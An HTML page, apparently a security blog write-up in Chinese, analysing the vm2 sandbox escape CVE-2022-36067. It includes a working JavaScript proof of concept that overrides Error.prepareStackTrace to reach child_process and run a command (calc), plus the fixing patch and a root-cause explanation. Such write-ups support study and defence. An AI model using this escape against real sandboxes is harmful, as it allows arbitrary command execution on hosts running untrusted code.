<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>cve-2022-36067</title>
	<link rel="stylesheet" href="https://stackedit.cn/style.css" />
</head>

<body class="stackedit">
	<a href="../index.html"
		style="position: fixed; top: 0; left: 2pt; text-align: center;text-decoration-line: none;color: black;font-size: 15px;">
		<img src="../img/home.png" width="15" height="15" alt="home">
		<span>HOME PAGE</span>
	</a>
	<div class="stackedit__html">
		<h2 id="pocexp"><span class="prefix"></span><span class="content">POC/EXP</span><span class="suffix"></span>
		</h2>
		<p>payload:</p>
		<pre class=" language-js"><code class="prism  language-js">globalThis<span class="token punctuation">.</span>OldError<span class="token operator">=</span>globalThis<span class="token punctuation">.</span>Error<span class="token punctuation">;</span>
<span class="token keyword">try</span><span class="token punctuation">{</span>
	<span class="token keyword">const</span> a<span class="token operator">=</span><span class="token number">123</span>
	a<span class="token operator">=</span><span class="token number">44</span>
<span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">{</span>
	console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

globalThis<span class="token punctuation">.</span>Error<span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
globalThis<span class="token punctuation">.</span>Error<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span><span class="token operator">=</span><span class="token punctuation">(</span>errStr<span class="token punctuation">,</span>traces<span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
	traces<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
	<span class="token punctuation">.</span><span class="token function">getThis</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">.</span>process
	<span class="token punctuation">.</span>mainModule
	<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span>
	<span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'calc'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">const</span> <span class="token punctuation">{</span>stack<span class="token punctuation">}</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">globalThis<span class="token punctuation">.</span>OldError</span>
</code></pre>
		<p>這段POC首先將全局對象Error保存爲OldError，隨後利用一個try…catch異常處理結果來捕獲異常，其中由於變量a由const修飾，所以在執行<code>a=44</code>時會觸發異常，之後通過<code>globalThis.Error={}</code>將Error對象置爲空對象並通過<code>globalThis.Error.prepareStackTrace=(errStr,traces)=&gt;{...}</code>重新定義Error對象的prepareStackTrace方法使其創建子進程calc，最後通過<code>const {stack}=new globalThis.OldError</code>來獲取異常堆棧，在獲取異常堆棧時會觸發Error.prepareStackTrace函數的調用。
		</p>
		<h2 id="分析"><span class="prefix"></span><span class="content">分析</span><span class="suffix"></span></h2>
		<p>將這段代碼放入vm2執行，理想狀態下不應該成功創建子進程，查看patch，它的修補patch非常簡單：</p>
		<pre class=" language-js"><code class="prism  language-js"><span class="token comment">// global is originally prototype of host.Object so it can be used to climb up from the sandbox.</span>

@@ <span class="token operator">-</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">7</span> <span class="token operator">+</span><span class="token number">67</span><span class="token punctuation">,</span><span class="token number">8</span> @@ Object<span class="token punctuation">.</span><span class="token function">defineProperties</span><span class="token punctuation">(</span>global<span class="token punctuation">,</span> <span class="token punctuation">{</span>
	global<span class="token punctuation">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> global<span class="token punctuation">,</span> writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> enumerable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
	globalThis<span class="token punctuation">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> global<span class="token punctuation">,</span> writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
	GLOBAL<span class="token punctuation">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> global<span class="token punctuation">,</span> writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token operator">-</span>	root<span class="token punctuation">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> global<span class="token punctuation">,</span> writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span>
<span class="token operator">-</span>	root<span class="token punctuation">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> global<span class="token punctuation">,</span> writable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> configurable<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token operator">+</span>	Error<span class="token punctuation">:</span> <span class="token punctuation">{</span>value<span class="token punctuation">:</span> LocalError<span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
		<p>從patch來看<code>Object.defineProperties</code> 方法在全局对象上定义了几个属性，以提供对全局对象的不同名称的访问。同时，还通过重写全局对象的
			<code>Error</code> 属性，将其指向vm2自定義的本地錯誤對象 <code>LocalError</code>，从而改变了全局错误对象的行为。
		</p>
		<p>通過patch也很容易可以看出漏洞產生的原因，由於忽視了原始Error對象prepareStackTrace方法可以被重寫的問題，導致將原始的Error對象被暴露。</p>
		<p>“prepareStackTrace”方法，可以实现自定义调用堆栈。这意味着当发生错误并且访问抛出的错误对象的“stack”属性时，Node.js会调用此方法，并将错误的字符串表示以及作为参数的“CallSite”对象数组提供给它，数组中的每个“CallSite”对象代表一个不同的堆栈帧。它们共同组成了错误发生时的调用堆栈状态。其中“CallSite”对象公开的一个方法是“getThis”，它负责返回相关堆栈帧中可用的“this”对象。这种行为可能导致沙盒逃逸，因为一些“CallSite”对象在调用“getThis”方法时可能返回在沙盒之外创建的对象。一旦获得了在沙盒之外创建的“CallSite”对象，可能可以访问Node.js的全局对象并从那里执行任意系统命令。
		</p>
		<p>事實上vm2的维护者意识到覆盖“prepareStackTrace”可能导致沙盒逃逸，并试图通过使用自己的实现包装Error对象和“prepareStackTrace”方法来减轻这种逃逸路径，从而防止用户覆盖此方法：<br>
			<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-05-23/Zy4jAk0hbcFU9tS4.png"
				alt="输入图片说明"><br>
			而漏洞的提交者發現由於在global中未對Error對象進行包裝，所以儅通過global.Error的方式來獲取Error對象依然可以獲取到原始的Error對象而不是去獲取localError對象，但後面對錯誤對象的清潔處理都是在處理localError對象，所以通過這種方法來繞過對localError的過濾清潔。所以理論上來講使用Object.defineProperties中定義的global、globalThis、root都可以獲取到原始的Error對象。儅patch過後儅通過global.Error訪問錯誤對象時實際上還是在訪問localError，而localError已經被過濾清潔過了。
		</p>
	</div>
</body>

</html>